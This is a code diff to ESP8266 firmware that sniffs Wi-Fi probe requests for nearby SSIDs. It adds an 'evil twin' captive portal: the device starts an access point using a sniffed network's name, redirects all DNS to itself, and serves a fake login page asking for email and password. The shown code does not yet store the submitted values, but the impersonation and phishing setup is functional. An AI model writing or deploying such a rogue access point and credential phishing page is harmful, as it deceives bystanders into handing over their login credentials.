@@ -4,6 +4,8 @@ extern "C" {
 #include <ESP8266WiFi.h>
 #include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
 #include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
 
 SSD1306  display(0x3c, D5, D6);
 
@@ -59,21 +61,41 @@ struct SSID{
     signed average_rssi;
 };
 
-struct SSID SSIDlist[100];
+struct SSID SSIDlist[20];
 
 int SSIDcount = 0;
-int probeCount = 0;
 
 int numberOfInterrupts = 0;
 volatile byte interruptCounter = 0;
-const byte interruptPin = D1;
+const int interruptPin = D1;
 
 int numberOfInterrupts2 = 0;
 volatile byte interrupt2Counter = 0;
-const byte interrupt2Pin = D2;
+const int interrupt2Pin = D2;
 
 int demoMode = 0;
 int counter = 1;
+
+const byte DNS_PORT = 53;  //THESE WERE BREAKING IT ???
+IPAddress apIP(192, 168, 1, 1);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+String responseHTML = ""
+  "<!DOCTYPE html><html><head><title>CaptivePortal</title></head><body>"
+  "<section class='loginform cf'>"
+  "<form name='login' action='index_submit' method='get' accept-charset='utf-8'>"
+  "<ul>"
+  "<li><label for='usermail'>Email</label>"
+    "<input type='email' name='usermail' placeholder='yourname@email.com' required></li>"
+    "<li><label for='password'>Password</label>"
+    "<input type='password' name='password' placeholder='password' required></li>"
+    "<li>"
+    "<input type='submit' value='Login'></li>"
+  "</ul>"
+"</form>"
+"</section>"
+"</body></html>";
 
 static void showMetadata(SnifferPacket *snifferPacket) {
 
@@ -139,7 +161,6 @@ static void showMetadata(SnifferPacket *snifferPacket) {
   printf("%d, ", SSIDlist[match].uniques);
   printf("%d, ", match);
   printf("%d\n", SSIDcount);
-  probeCount++;
 
 }
 
@@ -168,7 +189,7 @@ static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
     return MAC;
 }
 
-static void hexDump(uint8_t* data){
+/*static void hexDump(uint8_t* data){
     int j = 0;
     printf("000%02x  ", j);
 
@@ -183,7 +204,7 @@ static void hexDump(uint8_t* data){
             printf("000%02x  ", j);
         }
     }
-}
+}*/
 
 static char* stringToChar(String s, int buffer){
     char array[buffer];
@@ -194,7 +215,7 @@ static char* stringToChar(String s, int buffer){
 }
 
 String scan = "Scanning";
-void displayScanning() {
+static void ICACHE_FLASH_ATTR displayScanning() {
   int progress = (counter / 2) % 100;
     // draw the progress bar
   display.drawProgressBar(0, 32, 120, 10, progress);
@@ -211,20 +232,46 @@ void displayScanning() {
   display.drawString(0, 0, scan);
 }
 
-void displaySSIDs() {
+static void ICACHE_FLASH_ATTR displaySSIDs() {
   display.setTextAlignment(TEXT_ALIGN_LEFT);
-  for ( int i = 0 ; i <= SSIDcount ; i++){
-      display.drawRect(0, numberOfInterrupts2*10, 70, 12);
+  display.drawString(0, 0, "SSID");
+  display.drawString(90, 0, "uniques");
+  for ( int i = 1 ; i <= SSIDcount ; i++){
+      display.drawRect(0, (numberOfInterrupts2+1)*10, 70, 12);
 
-      display.drawString(0, i*10, SSIDlist[i+1].name);
+      display.drawString(0, i*10, SSIDlist[i].name);
+      display.drawString(90, i*10, String(SSIDlist[i].uniques));
   }
 }
 
-void handleInterrupt() {
+static void captivePortal(){
+
+  //yield();
+  wifi_set_opmode(WIFI_AP);
+  delay(10);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  //WiFi.softAP("ESP-D1mini");
+  delay(10);
+  char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
+  WiFi.softAP(ap);
+  delay(10);
+  // if DNSServer is started with "*" for domain name, it will reply with
+  // provided IP to all DNS request
+  dnsServer.start(DNS_PORT, "*", apIP);
+  delay(10);
+  // replay to all requests with same HTML
+  webServer.onNotFound([]() {
+    webServer.send(200, "text/html", responseHTML);
+  });
+  webServer.begin();
+
+}
+
+static void ICACHE_FLASH_ATTR handleInterrupt() {
   interruptCounter++;
 }
 
-void handleInterrupt2() {
+static void ICACHE_FLASH_ATTR handleInterrupt2() {
   interrupt2Counter++;
 }
 
@@ -255,9 +302,9 @@ void setup() {
     //Start serial connection
     Serial.begin(115200);
     pinMode(interruptPin, INPUT_PULLUP);
-    attachInterrupt(digitalPinToInterrupt(interruptPin), handleInterrupt, FALLING);
+    attachInterrupt(interruptPin, handleInterrupt, FALLING);
     pinMode(interrupt2Pin, INPUT_PULLUP);
-    attachInterrupt(digitalPinToInterrupt(interrupt2Pin), handleInterrupt2, FALLING);
+    attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);
 
     // set the WiFi chip to "promiscuous" mode aka monitor mode
     delay(10);
@@ -297,10 +344,13 @@ void loop() {
     demoMode = 1;
     //timeSinceLastModeSwitch = millis();
   }
+
   if(interruptCounter > 0){
 
       interruptCounter--;
       numberOfInterrupts++;
+      detachInterrupt(interruptPin);
+      detachInterrupt(interrupt2Pin);
 
       Serial.print("An interrupt has occurred. Total: ");
       Serial.println(numberOfInterrupts);
@@ -309,32 +359,47 @@ void loop() {
 
       wifi_set_promiscuous_rx_cb(NULL);
 
-      wifi_set_opmode(WIFI_AP);
+      delay(10);
+      //wifi_set_opmode(WIFI_AP);
+      captivePortal();
 
       /*for ( int i = 1 ; i <= SSIDcount ; i++){
           Serial.println(SSIDlist[i].name);
       }*/
+      delay(10);
 
+      //WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
       Serial.print("Setting AP for ");
       Serial.print(SSIDlist[numberOfInterrupts2+1].name);
       Serial.print("...");
-      char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
-      Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");
+      /*char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
+      Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");*/
+
+      delay(10);
+
+
 
   }
+
   if(interrupt2Counter > 0){
     interrupt2Counter--;
     numberOfInterrupts2++;
   }
-  if(numberOfInterrupts > 0){
-      Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
-      delay(3000);
 
+  if(numberOfInterrupts > 0){
+
+      Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
+      delay(10);
+      dnsServer.processNextRequest();
+      delay(10);
+      webServer.handleClient();
+      //delay(3000);
   }
-  if(numberOfInterrupts2 > 5){
+  if(numberOfInterrupts2 > 4){
     numberOfInterrupts2 = 0;
   }
+
   counter++;
-  delay(500);
+  delay(100);
 
 }
